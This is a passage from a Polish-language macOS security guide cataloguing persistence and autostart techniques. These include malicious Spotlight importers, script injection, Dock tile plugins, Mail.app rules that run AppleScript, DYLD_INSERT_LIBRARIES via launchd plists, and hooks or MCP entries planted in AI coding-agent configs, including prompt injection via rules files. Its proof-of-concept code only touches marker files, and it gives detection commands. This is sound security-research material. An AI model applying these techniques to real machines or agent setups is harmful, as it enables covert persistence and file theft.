- `Some.app/Contents/Library/Spotlight/`
  - **Wyzwalacz**: Utworzenie nowego pliku z rozszerzeniem obsługiwanym przez wtyczkę Spotlight.
  - Wymagana nowa aplikacja

#### Opis i wykorzystanie

Spotlight to wbudowana w macOS funkcja wyszukiwania, zaprojektowana tak, aby zapewnić użytkownikom **szybki i kompleksowy dostęp do danych na ich komputerach**.\
Aby umożliwić szybkie wyszukiwanie, Spotlight utrzymuje **własnościową bazę danych** i tworzy indeks, **analizując większość plików**, co pozwala szybko wyszukiwać zarówno nazwy plików, jak i ich zawartość.<sup>[[25]](#references)</sup>

Podstawą działania Spotlight jest centralny proces o nazwie „mds”, co oznacza **„serwer metadanych”**. Proces ten koordynuje działanie całej usługi Spotlight. Współpracuje z nim wiele demonów „mdworker”, które wykonują różne zadania konserwacyjne, takie jak indeksowanie różnych typów plików (`ps -ef | grep mdworker`). Zadania te są możliwe dzięki wtyczkom importera Spotlight, czyli **„pakietom .mdimporter”**, które pozwalają Spotlight rozpoznawać i indeksować zawartość wielu różnych formatów plików.

Wtyczki lub pakiety **`.mdimporter`** znajdują się w wymienionych wcześniej lokalizacjach. Nowy pakiet musi zostać wykryty i być zgodny z typem pliku, a Spotlight musi faktycznie zaindeksować pasujący plik; samo skopiowanie pakietu nie dowodzi, że został on załadowany. [Dokumentacja MDImporter firmy Apple](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) wskazuje, że załadowanie wymaga odpowiedniego zmienionego pliku. Wykonywanie importerów Spotlight w macOS 26 nie było tu testowane.

Wszystkie załadowane `mdimporters` można **znaleźć**, uruchamiając:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

Na przykład **/Library/Spotlight/iBooksAuthor.mdimporter** służy do analizowania tego typu plików (między innymi z rozszerzeniami `.iba` i `.book`):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> Jeśli sprawdzisz Plist innego `mdimporter`, możesz nie znaleźć wpisu **`UTTypeConformsTo`**. To dlatego, że jest to wbudowany _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) i nie trzeba określać dla niego rozszerzeń.
>
> Ponadto domyślne wtyczki systemowe mają zawsze pierwszeństwo, więc atakujący może uzyskać dostęp tylko do plików, które nie są indeksowane przez własne `mdimporters` firmy Apple.

Aby utworzyć własny importer, możesz zacząć od tego projektu: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), a następnie zmienić nazwę i **`CFBundleDocumentTypes`**, a także dodać **`UTImportedTypeDeclarations`**, aby obsługiwał wybrane rozszerzenie, i uwzględnić je w **`schema.xml`**.\
Następnie **zmień** kod funkcji **`GetMetadataForFile`**, aby uruchamiała payload po utworzeniu pliku z obsługiwanym rozszerzeniem.

Na koniec **zbuduj nowy plik `.mdimporter` i skopiuj go** do jednej z trzech wcześniej wymienionych lokalizacji. Możesz sprawdzić, czy został załadowany, **monitorując logi** lub uruchamiając **`mdimport -L`**.

> [!TIP]
> Chociaż sandbox importera jest bardzo restrykcyjny, `mdworker` indeksuje pliki z **uprzywilejowanym dostępem do odczytu**. Złośliwy `.mdimporter` może więc odczytywać *zawartość* plików z lokalizacji chronionych przez TCC (Pobrane, Obrazy, Biurko, …) i eksfiltrować zebrane metadane bez żadnego monitu TCC — **obejście TCC „Sploitlight” (CVE-2025-31199)**, załatane w macOS Sequoia 15.4.<sup>[[55]](#references)</sup>

### ~~Panel preferencji~~

> [!CAUTION]
> Wygląda na to, że to już nie działa.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Wymaga konkretnego działania użytkownika
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Opis

Wygląda na to, że to już nie działa.<sup>[[26]](#references)</sup>

### Pliki skryptów aplikacji

Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga jednak, aby docelowa aplikacja była zainstalowana, a ofiara ją uruchomiła/używała
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

**Interpretowany skrypt, który rzeczywiście wykonuje zainstalowana aplikacja lub narzędzie i który atakujący może zmodyfikować**. Sprawdź uprawnienia pliku i ścieżkę wywołania; samo znalezienie pliku `.sh` lub `.py` nie wystarczy. Zgodnie z [przewodnikiem Apple dotyczącym podpisywania kodu](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html), podpisane pakiety aplikacji zabezpieczają zasoby, w tym skrypty. Edycja skryptu wewnątrz pakietu narusza to zabezpieczenie i może zostać wykryta lub zablokowana podczas weryfikacji pakietu. Zewnętrzne skrypty, takie jak launcher Homebrew, podlegają innym zasadom podpisywania i zaufania. Historyczne przykłady z writeupu obejmują:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – skrypt używany w starszych wersjach Sublime Text; należy sprawdzić obecność pliku i sposób jego użycia podczas uruchamiania w zainstalowanej wersji. Nie było go na testowym Macu.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) lub **`/usr/local/bin/brew`** (Intel) – launcher Bash uruchamiany przy wywołaniu danego pliku `brew`, jeśli jest zainstalowany i zapisywalny przez atakującego. Na testowym Macu `/opt/homebrew/bin/brew` był zapisywalnym skryptem Bash; to lokalna obserwacja, a nie ogólna zasada dotycząca uprawnień Homebrew.
- **`idlemain.py` w pakiecie aplikacji Pythona IDLE** – zapis do pliku może wymagać uprawnień administratora, ale skrypt działa z tożsamością użytkownika IDLE.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – historyczny skrypt powłoki uruchamiany jako root, gdy zainstalowane jest odpowiadające mu zadanie launchd `org.wireshark.ChmodBPF`. Skryptu i zadania nie było na testowym Macu.

#### Opis i wykorzystanie

Niektóre narzędzia i aplikacje wykonują interpretowane skrypty w czasie działania. Zapisywalny skrypt może uruchomić dodane polecenia przy kolejnym uruchomieniu przez jego konkretnego wywołującego, o ile pozwalają na to weryfikacja podpisu, kwarantanna i inne mechanizmy kontrolne. W oryginalnych badaniach opisano kilka instalacji z 2019 roku; ponownie sprawdź ich ścieżki i mechanizmy uruchamiania w docelowej wersji.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

Ten test kopii zwrócił `marker fired: True` w macOS 26.5.2; oryginalny launcher pozostał nietknięty. Dowodzi to, że punkt wstawienia jest wykonywany w kopii, a nie tego, że zmodyfikowany, podpisany bundle aplikacji lub rzeczywista instalacja Homebrew przejdą wszystkie kontrole uruchamiania.

### Dock Tile Plugins

Opis: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Przydatne do ominięcia sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga, aby aplikacja deklarująca plug-in została wykryta/zarejestrowana i przetworzona przez Dock
  - Plugin ładuje się do **podpisanego przez Apple** helpera, który nie ma uprawnienia app-sandbox, a **weryfikacja bibliotek jest wyłączona**. W cytowanym badaniu tego helpera nie było widać w interfejsie Background Task Management; widoczność w docelowym wydaniu należy sprawdzić.
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, wskazywany kluczem **`NSDockTilePlugIn`** w pliku `Info.plist` aplikacji; własny plik `Info.plist` pluginu ustawia **`NSPrincipalClass`**.

#### Opis i wykorzystanie

Gdy aplikacja deklaruje `NSDockTilePlugIn`, Dock może załadować wskazany bundle do helpera XPC **`com.apple.dock.external.extra`** (`...extra.arm64` na Apple Silicon) podczas logowania lub dodawania jego kafelka; sama aplikacja nie musi zostać uruchomiona. Wymaga to, aby aplikacja została wykryta/zarejestrowana i zaakceptowana przez macOS. Helper jest **podpisany przez Apple**, nie ma uprawnienia `com.apple.security.app-sandbox`, a `com.apple.security.cs.disable-library-validation` jest w nim ustawione. Podczas ładowania wywoływana jest metoda **`setDockTile:`** klasy głównej; stamtąd można subskrybować rozproszone powiadomienia (np. `com.apple.screenIsLocked`) dotyczące późniejszych zdarzeń.<sup>[[38]](#references)</sup>

W macOS 26.5.2 inspekcja tylko do odczytu za pomocą `codesign` potwierdziła podpis Apple i uprawnienia helpera, a kilka zainstalowanych aplikacji deklarowało `NSDockTilePlugIn`. Na tym Macu nie zainstalowano ani nie załadowano nowego plug-inu, więc wykonanie nowo napisanego bundle’a w tej wersji pozostaje nieprzetestowane.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Writeup: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Rozszerzenie widgetu działa we **własnym procesie**, a dodanie go **nie** wywołuje alertu Background Task Management
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Plik konfiguracyjny plist znajduje się w kontenerze chronionym przez TCC, więc edycja go z zewnątrz wymaga Full Disk Access lub ominięcia TCC

#### Lokalizacja

- Bundle rozszerzenia widgetu: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Aktywne/zarejestrowane widgety: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (klucze `widgets.instances` i `widgets.widgets`)

#### Opis i wykorzystanie

Rozszerzenie WidgetKit dostarczane wewnątrz aplikacji działa we **własnym procesie** zarządzanym przez Notification Center. Zarejestrowanie instancji w `widgets.instances` (blob `CHSWidget` zakodowany w formacie base64 przez `NSKeyedArchiver`, zawierający osadzone dane `INIntent`) i ponowne uruchomienie NotificationCenter powoduje załadowanie widgetu i wykonanie jego kodu `TimelineProvider`/intent.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Reguły Mail.app (Run AppleScript)

Opis: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Mail.app musi być jednak skonfigurowany z kontem i uruchomiony; wyzwalaczem jest przychodzący e-mail
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Edycja reguł/skryptów spoza Mail może wymagać zamknięcia Mail i przyznania Full Disk Access w nowszych wersjach macOS

#### Lokalizacja

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (reguły lokalne; `V10` w Sonoma/Sequoia, `V11`+ w nowszych wersjach)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (reguły synchronizowane przez iCloud, mają pierwszeństwo)
- Aktywacja reguł: **`RulesActiveState.plist`**; payload AppleScript: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Opis i wykorzystanie

Reguła Apple Mail może mieć akcję *„Run AppleScript”*. Dodając regułę dopasowującą spreparowany **temat wiadomości** i uruchamiającą skrypt atakującego, przeciwnik uzyskuje **zdalnie wyzwalane, skryte** wykonywanie kodu w kontekście Mail za każdym razem, gdy nadejdzie specjalnie spreparowany e-mail — jest to wektor omijający wiele skanerów wykrywających mechanizmy persistence, ponieważ nie jest tworzony żaden LaunchAgent ani Login Item.<sup>[[42]](#references)</sup> Ustawienie reguły tak, by również **usuwała** wyzwalający e-mail, ukrywa ślady. Obrońcy mogą bezpośrednio poszukiwać tej reguły:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Profile konfiguracyjne (.mobileconfig)

Opis: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Przydatne do obejścia sandbox: [🔴](https://emojipedia.org/large-red-circle)
  - Nowoczesny macOS wymaga **ręcznego zatwierdzenia przez użytkownika** w Ustawieniach systemowych → *Zarządzanie urządzeniami* (cicha instalacja przez `profiles install` nie jest już możliwa poza MDM)
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Zainstalowane profile znajdują się w **`/Library/Managed Preferences/`** i **`/var/db/ConfigurationProfiles/`**; profil to plik XML plist zawierający tablicę `PayloadContent`.

#### Opis i wykorzystanie

Plik `.mobileconfig` nie jest bezpośrednim mechanizmem wykonywania kodu, ale może utrwalać konfigurację, taką jak **zaufany główny CA** (`com.apple.security.root`), **globalny proxy lub proxy PAC** (`com.apple.proxy.*`), **zarządzane preferencje** (`com.apple.ManagedClient.preferences`) lub ograniczenia. W macOS 10.15 i nowszych definicja [`PayloadRemovalDisallowed` firmy Apple](https://developer.apple.com/documentation/devicemanagement/toplevel) stanowi, że ustawienie tej wartości na `true` w profilu **zainstalowanym ręcznie**, bez payloadu z hasłem wymaganym do usunięcia, wymaga **uwierzytelnienia administratora**, aby usunąć profil; nie czyni go to całkowicie niemożliwym do usunięcia. Profile zainstalowane przez MDM podlegają odrębnym zasadom zarządzania i usuwania.<sup>[[44]](#references)</sup>

> [!WARNING]
> Zwykły profil konfiguracyjny **nie ma typu payloadu, który umieszcza dowolny `LaunchDaemon`/`LaunchAgent`**. Zainstalowanie demona w ten sposób wymaga pełnej **rejestracji w MDM** oraz agenta/skryptu zarządzającego — nie traktuj `.mobileconfig` jako mechanizmu dostarczania launchd.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### Persistencja DYLD_INSERT_LIBRARIES

- Przydatne do bypassu sandboxa: [🔴](https://emojipedia.org/large-red-circle)
  - dyld **usuwa** `DYLD_*` dla binariów SIP/platformy, aplikacji z hardened runtime i celów setuid, więc wstrzykuje tylko do niezabezpieczonych procesów i **nie** omija SIP ani hardened runtime
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Niezawodna metoda: słownik **`EnvironmentVariables`** w złośliwym pliku plist `LaunchAgent`/`LaunchDaemon` (uruchamianym przy logowaniu/rozruchu)
- Nieaktualne historyczne lokalizacje (wspomnieć tylko w raporcie): **`~/.MacOSX/environment.plist`** (usunięte w 10.8) i **`/etc/launchd.conf`** (usunięte w 10.10)

#### Opis i wykorzystanie

Jeśli atakujący może umieścić `DYLD_INSERT_LIBRARIES` w środowisku procesu ofiary, dyld załaduje do tego procesu dylib atakującego (uruchomi się jej konstruktor). Wariant trwały umieszcza tę zmienną w `LaunchAgent`, dzięki czemu każde uruchomienie zadania powoduje ponowne wstrzyknięcie. Pamiętaj, że we współczesnym macOS `launchctl setenv DYLD_*` jest filtrowane, więc zamiast tego umieść zmienną w pliku plist.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Pełny opis mechaniki dylib injection/hijacking znajdziesz tutaj:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### CLI agentów kodujących AI (hooks, serwery MCP, pliki reguł)

Opisy: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [backdoor w pliku reguł (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Przydatne do omijania sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga, aby developer używał danego agenta. Polecenia startowe są wykonywane z uprawnieniami tego użytkownika, gdy agent zaakceptuje jego konfigurację; zaufanie do workspace i zatwierdzanie MCP zależą od produktu i trybu sesji.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle) (działa jako użytkownik; dziedziczy uprawnienia, które ma już terminal/agent)

#### Lokalizacja

Jawne pliki konfiguracyjne hooks i MCP mogą powodować **uruchamianie poleceń shell lub procesów potomnych, gdy developer używa narzędzia** — z globalnego pliku użytkownika (persistence) albo z pliku dodanego do repozytorium (supply-chain). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` i reguły edytora to **instrukcje dla agenta**, a nie gwarancja uruchomienia poleceń shell podczas odczytu; ich działanie zależy od zachowania agenta i uprawnień narzędzia. Sprawdź aktualne zasady zaufania i zatwierdzania dla każdego produktu.

- **Claude Code**
  - `~/.claude/settings.json`, projektowe `.claude/settings.json`, `.claude/settings.local.json` oraz dostępny tylko dla roota **`/Library/Application Support/ClaudeCode/managed-settings.json`** (ustawień MDM/zarządzanych **nie można nadpisać** przez użytkownika → silne persistence)
  - Obiekt `hooks` — zdarzenia `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — każde uruchamia polecenie shell `command`
  - `statusLine.command` — polecenie shell wykonywane w celu wyświetlenia linii statusu (podczas każdej sesji)
  - Serwery MCP w `~/.claude.json` / projektowym `.mcp.json` — `command`+`args` uruchamiane jako procesy potomne
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — instrukcje, które mogą próbować przeprowadzić prompt injection, zależnie od zachowania agenta i uprawnień narzędzia
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` uruchamiane jako procesy potomne); instrukcje projektowe `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, serwery MCP); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … uruchamiają polecenia); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`

#### Opis i wykorzystanie

Jeśli ktoś może modyfikować globalne ustawienia użytkownika, jego hooks lub polecenia MCP mogą być uruchamiane podczas kolejnych sesji na tym koncie. Konfiguracja kontrolowana przez repozytorium to odrębny przypadek: [aktualna dokumentacja bezpieczeństwa Claude Code](https://code.claude.com/docs/en/security) opisuje interaktywne okno dialogowe zaufania do workspace oraz osobny monit o zatwierdzenie serwerów projektowych `.mcp.json`. [Macierz uprawnień](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) wskazuje, że hooks mogą być uruchamiane po zaufaniu folderowi nadrzędnemu, a sesje `claude -p`/SDK nie wyświetlają interaktywnego monitu o zaufanie; w tych trybach nieinteraktywnych serwery projektowe MCP łączą się bez monitu o zatwierdzenie. Zgłoszony w CVE-2025-59536 bypass hooka projektowego przed zaufaniem został [naprawiony w 2025 roku](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); nie traktuj go jako obecnego domyślnego zachowania. Sposoby dostarczenia mogą obejmować przejęte repozytorium lub złośliwy instalator. Prompt injection za pośrednictwem pliku reguł jest mniej przewidywalny niż jawny hook i nadal zależy od zatwierdzeń narzędzi.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Przykładowe globalne ustawienia użytkownika Claude Code; do testów używaj ich wyłącznie na koncie przeznaczonym do tego celu:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Przykładowa globalna konfiguracja Codex MCP dla użytkownika:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Przykładowa konfiguracja hooka Cursor; przed użyciem sprawdź schemat dla zainstalowanej wersji:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Rozszerzenia przeglądarki (Chromium: Chrome / Brave / Edge)

Opis: [Zewnętrzne rozszerzenia Chrome](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [Nadużywanie ExtensionInstallForcelist w macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Przydatne do omijania sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga obsługiwanej przeglądarki oraz zainstalowanego i włączonego rozszerzenia. Zewnętrzne rozszerzenia w macOS wymagają potwierdzenia przez użytkownika; wymuszona instalacja zarządzana wymaga odpowiedniej polityki enterprise.
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> To coś innego niż **hosty native messaging** (zobacz sekcję *Hosty native messaging Chrome* powyżej). W tym przypadku mechanizmem utrzymywania dostępu jest samo **automatycznie instalowane rozszerzenie**.

#### Lokalizacja

- **Plik JSON External Extensions** (wykrywany przy uruchamianiu przeglądarki, po czym w macOS pojawia się prośba o włączenie):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (dla jednego użytkownika) lub `/Library/Application Support/Google/Chrome/External Extensions/` (dla wszystkich użytkowników)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Wymuszona instalacja przez politykę enterprise** za pośrednictwem zarządzanych preferencji / profilu konfiguracji:
  - klucz `ExtensionInstallForcelist` w `com.google.Chrome` (`com.brave.Browser` w Brave, `com.microsoft.Edge` w Edge), odczytywany z `/Library/Managed Preferences/` lub z zainstalowanego pliku `.mobileconfig`

#### Opis i wykorzystanie

To dwie różne metody instalacji. Dokumentacja Chrome dotycząca [instalacji zewnętrznej](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) informuje, że **użytkownicy systemów Windows i macOS muszą potwierdzić i włączyć** rozszerzenie oferowane za pośrednictwem pliku *External Extensions*; samo zapisanie tego pliku JSON nie powoduje jego uruchomienia. W przypadku instalacji dla wszystkich użytkowników w macOS Chrome wymaga również, aby plik zewnętrznego rozszerzenia był chroniony przed modyfikacją przez użytkowników bez uprawnień. Zarządzana polityka `ExtensionInstallForcelist` lub `ExtensionSettings` może zainstalować i przypiąć rozszerzenie bez interakcji z użytkownikiem; [przewodnik Google dotyczący polityk na komputerach Mac](https://support.google.com/chrome/a/answer/7517624) opisuje zarządzaną konfigurację i informuje, że użytkownik nie może usunąć wymuszonych rozszerzeń. To ścieżka wdrożenia za pomocą polityki, a nie skrót polegający na użyciu `defaults write` dla pojedynczego użytkownika.<sup>[[49]](#references)</sup>

> [!WARNING]
> W macOS manifest JSON *External Extensions* musi wskazywać adres URL aktualizacji **Chrome Web Store**, a nie lokalny plik CRX. Wdrożenie za pomocą zarządzanej polityki ma własne wymagania enterprise i może dopuszczać zarządzany, samodzielnie hostowany adres URL aktualizacji. Do testowania lokalnego, rozpakowanego rozszerzenia w profilu Chrome służy osobny przełącznik trybu deweloperskiego `--load-extension=/path`; nie sprawia on, że plik JSON External Extensions samoczynnie instaluje rozszerzenie. Nie traktuj zapisu do `Secure Preferences` jako odpowiednika żadnej z udokumentowanych metod rejestracji.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Uruchom Chrome na tymczasowym koncie i obserwuj monit o włączenie rozszerzenia; zachowanie samego rozszerzenia stanowi PoC wykonania po zaakceptowaniu przez użytkownika. Po teście usuń manifest i wyłącz lub odinstaluj rozszerzenie w tym profilu. Tej ścieżki **nie** testowano w aktywnym profilu Chrome na Macu używanym do badań. Nie wdrożono tam również ścieżki przez zarządzane zasady.

Force-install i External Extensions odwołują się do identyfikatorów rozszerzeń **Chrome Web Store**; informacje o niższopoziomowej sztuczce polegającej na cichym wstrzykiwaniu lokalnego rozszerzenia przez edycję pliku `Secure Preferences` profilu podpisanego HMAC oraz o innych nadużyciach procesów Chromium znajdziesz tutaj:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### Schematy URL i programy obsługujące typy plików (LaunchServices)

Opis: [Remote Mac Exploitation Via Custom URL Schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Wyzwalaczem jest kliknięcie linku przez ofiarę (np. w Chrome/Brave/Safari) lub otwarcie pliku z zarejestrowanym typem
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- `Info.plist` pakietu aplikacji deklarujący **`CFBundleURLTypes`/`CFBundleURLSchemes`** (niestandardowy schemat URL) lub **`CFBundleDocumentTypes`** (rozszerzenie pliku/UTI)
- Efektywne ustawienia domyślne użytkownika mogą znajdować się w tablicy `LSHandlers` w **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`**. Obsługiwanym przez Apple API do wyboru domyślnego programu obsługującego schemat URL jest `LSSetDefaultHandlerForURLScheme`; bezpośrednia modyfikacja tego pliku plist nie jest udokumentowaną metodą rejestracji ani aktualizacji pamięci podręcznej.

#### Opis i wykorzystanie

